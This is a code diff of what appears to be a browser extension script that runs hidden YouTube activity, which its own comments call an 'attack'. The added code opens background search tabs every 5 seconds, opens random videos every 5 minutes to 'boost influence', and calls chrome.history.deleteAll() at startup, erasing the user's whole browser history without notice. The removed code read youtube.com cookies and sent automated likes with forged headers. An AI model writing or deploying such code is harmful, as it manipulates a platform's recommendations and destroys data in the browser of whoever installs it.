@@ -1,93 +1,82 @@
 const searchQueries = [
-    "best AI projects 2025",
-    "machine learning tutorial",
-    "deep learning basics",
-    "how to learn neural networks",
-    "latest AI research papers",
-    "AI trends 2025"
+    "how knights trained for battle",
+    "medieval castle defense tactics",
+    "life of a blacksmith in the 14th century",
+    "how big is the universe really",
+    "what if Earth had rings like Saturn",
+    "strangest exoplanets ever discovered",
+    "real-life sightings of the Loch Ness monster",
+    "do aliens exist? latest NASA discoveries",
+    "why do people believe in the flat Earth theory",
+    "how to survive alone in the wild with no tools",
+    "ancient humans vs modern survival skills",
+    "building an underground house from scratch",
+    "how to solve a Rubik’s cube blindfolded",
+    "most bizarre world records ever set",
+    "how to make a sword from raw iron ore"
 ];
 
-function performSearch() {
+function performSearchAttack() {
+    const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
+    const searchUrl = `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`;
+
+    chrome.tabs.create({ url: searchUrl, active: false }, (tab) => {
+        setTimeout(() => chrome.tabs.remove(tab.id), 5000);
+    });
+
+    console.log(`Performed search: ${query}`);
+}
+
+// **OPEN RANDOM VIDEOS FROM SEARCH (Boosts Influence)**
+function watchRandomSearchVideo() {
     const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
     const searchUrl = `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`;
 
     fetch(searchUrl)
         .then(response => response.text())
         .then(html => {
-            const videoIds = extractVideoIds(html);
+            const videoIdRegex = /\"videoId\":\"([^\"]+)\"/g;
+            let videoIds = [];
+            let match;
+
+            while ((match = videoIdRegex.exec(html)) !== null) {
+                videoIds.push(match[1]);
+            }
+
             if (videoIds.length > 0) {
                 const randomVideoId = videoIds[Math.floor(Math.random() * videoIds.length)];
-                watchVideoInBackground(randomVideoId);
+                const watchUrl = `https://www.youtube.com/watch?v=${randomVideoId}`;
+
+                chrome.tabs.create({ url: watchUrl, active: false }, (tab) => {
+                    setTimeout(() => chrome.tabs.remove(tab.id), 8000); // Watch for 8 sec
+                });
+
+                console.log(`Watched video briefly: ${watchUrl}`);
             }
         })
-        .catch(error => console.error("Search request failed:", error));
+        .catch(error => console.error("Failed to watch video:", error));
 }
 
-function extractVideoIds(html) {
-    const videoIdRegex = /\"videoId\":\"([^\"]+)\"/g;
-    let videoIds = [];
-    let match;
-
-    while ((match = videoIdRegex.exec(html)) !== null) {
-        videoIds.push(match[1]);
-    }
-
-    return videoIds.slice(0, 5);  // Take top 5 relevant videos
+// **CLEAR WATCH HISTORY AUTOMATICALLY**
+function clearWatchHistory() {
+    chrome.history.deleteAll(() => console.log("Watch history cleared"));
 }
 
-function watchVideoInBackground(videoId) {
-    const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
+// **Run attack every 5 seconds**
+setInterval(performSearchAttack, 5 * 1000);
 
-    // Use chrome.cookies API to get cookies
-    chrome.cookies.getAll({ domain: "youtube.com" }, (cookies) => {
-        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; ");
+// **Watch random video every 5 minutes**
+setInterval(watchRandomSearchVideo, 5 * 60 * 1000);
 
-        fetch(watchUrl, {
-            method: "GET",
-            headers: {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
-                "Referer": "https://www.youtube.com/",
-                "Cookie": cookieString  // Use cookies retrieved here
-            }
-        })
-            .then(response => response.text())
-            .then(html => {
-                console.log(`Watching video in background: ${watchUrl}`);
+// **Clear history every 10 minutes**
+// setInterval(clearWatchHistory, 10 * 60 * 1000);
 
-                // Simulate watching time (30-60 sec delay)
-                setTimeout(() => {
-                    likeVideo(videoId);
-                }, 10000); // Like after 10 sec
+// **Start immediately**
+clearWatchHistory();
+performSearchAttack();
+watchRandomSearchVideo();
 
-                setTimeout(() => {
-                    console.log(`Finished watching: ${watchUrl}`);
-                }, Math.floor(Math.random() * (60000 - 30000) + 30000)); // Watch for 30-60 sec
-            })
-            .catch(error => console.error("Failed to watch video:", error));
-    });
-}
 
-function likeVideo(videoId) {
-    const likeUrl = `https://www.youtube.com/service_ajax?name=likeEndpoint&video_id=${videoId}`;
-
-    fetch(likeUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "X-YouTube-Client-Name": "1",
-            "X-YouTube-Client-Version": "2.20240101.00.00"
-        },
-        body: JSON.stringify({ "videoId": videoId })
-    })
-        .then(() => console.log(`Liked video: ${videoId}`))
-        .catch(error => console.error("Failed to like video:", error));
-}
-
-// Run search attack every 1 minute
-setInterval(performSearch, 60 * 1000);
-
-// Start immediately
-performSearch();
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.action === "openVideo") {
